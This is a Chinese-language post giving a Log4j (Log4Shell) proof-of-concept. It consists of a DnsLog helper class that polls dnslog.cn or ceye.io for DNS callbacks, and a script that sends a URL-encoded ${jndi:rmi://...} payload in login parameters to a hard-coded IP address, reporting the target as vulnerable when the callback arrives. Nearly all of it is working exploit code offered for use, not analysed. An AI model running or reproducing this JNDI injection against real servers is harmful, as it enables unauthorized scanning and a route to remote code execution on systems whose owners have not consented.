log4j的poc脚本：利用dnslog平台，编写查询每次请求解析效果打印，调用dnslog脚本，将提供的url加上漏洞uri，进行requests请求，后若是dnslog平台有解析，脚本自动打印出对应内容。


dns平台脚本
```
# -*- encoding: utf8 -*-
#!/usr/bin/python
'''
@File    :   DnsLog.py
@Time    :   2023/10/17 11:01
@Author  :   changge 
'''
import requests
import json
import random
import string 

class DnsLog:
    session = requests.session()
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0", "Accept": "*/*", "Accept-Language": "zh-CN,en-US;q=0.7,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "http://dnslog.cn/", "Connection": "close"}
    ceye = "72xfv4.ceye.io"
    domain = ""
    keyWord = ''.join(random.choice(string.ascii_lowercase) for _ in range(5))
    # 获取dnslog的域名
    def __init__(self):
        burp0_url = "http://dnslog.cn:80/getdomain.php?t=0.6629258837687702"
        try:
            res = self.session.get(burp0_url, headers=self.headers)
            self.domain = self.keyWord + '.' + res.text
        except:
            self.domain = self.keyWord + '.' + self.ceye


    # 判断使用那个方法
    def Verify(self):
        if self.domain.find("ceye") != -1:
            res = self.__CeyeView()
        else :
            res = self.__DnsLogView()
        return res


    # 测试dnslog，查询
    def __DnsLogView(self):
        burp0_url = "http://dnslog.cn:80/getrecords.php?t=0.991116075227615"
        res2 = self.session.get(burp0_url, headers=self.headers)
        print(json.loads(res2.text))
        if res2.text.find(self.keyWord) != -1:
            return True
        else:
            return False


    def __CeyeView(self):
        burp0_url = "http://api.ceye.io/v1/records?token=此处填写token的值="+self.keyWord
        res = requests.get(burp0_url)
        resJson = json.loads(res.text)
        data = resJson["data"]
        if len(data) >=1:
            # print("查询成功",data)
            return True
        else:
            print("查询失败")
            return False

if __name__ == "__main__":
    dnslog = DnsLog()
    print(dnslog.domain)
    input("测试")
    if dnslog.Verify():
        print("存在")
    else:
        print("不存在")

```


log4j poc脚本正文


```
from dnslog import DnsLog
import requests

dnslog = DnsLog()

burp0_url = "http://106.15.50.112:9090/rce?username=%24%7Bjndi%3Armi%3A%2F%2F"+dnslog.domain+"%2Fa%7D&password=%24%7Bjndi%3Armi%3A%2F%2F"+dnslog.domain+"%2Fa%7D"
burp0_cookies = {"JSESSIONID": "5413FB2AE9B543D7B163643F50388FDB"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0", "Accept": "*/*", "Accept-Language": "zh-CN,en-US;q=0.7,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Referer": "http://106.15.50.112:9090/", "Connection": "close"}
requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)

if dnslog.Verify():
    print("漏洞存在")
```
